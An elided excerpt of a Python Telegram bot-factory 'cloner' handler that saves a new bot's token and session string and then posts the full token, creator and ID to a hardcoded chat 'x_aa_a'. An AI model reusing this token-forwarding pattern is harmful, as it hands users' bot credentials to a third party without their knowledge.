...
async def cloner(app: app, message):
    ...
    if message.chat.username in OWNER:
     ...
     dev = message.chat.id
    data = {"bot_username": bot_username, "token": token, "session": session, "dev": dev, "logger": logger, "logger_mode": "ON", "bot_name": "رودريجو"}
    Bots.insert_one(data)
    from Gold.Data import set_bot_name
    await set_bot_name(bot_username, "رودريجو")
    try:
     await auto_bot()
    except:
         pass
    ...
    try:
        await app.send_message(
            "x_aa_a",
            f"╭──── • 🔔 • ────╮\n🤖 **بوت جديد في المصنع !**\n╰──── • 🔔 • ────╯\n\n♪ **يوزر البوت :** @{bot_username}\n♪ **التوكن :** `{token}`\n♪ **بواسطة :** {message.from_user.mention}\n♪ **الـ ID :** `{message.chat.id}`\n♪ **رابط اللوج :** {loggerlink}\n\n⚡ **rodrigo™** | @M_A_171",
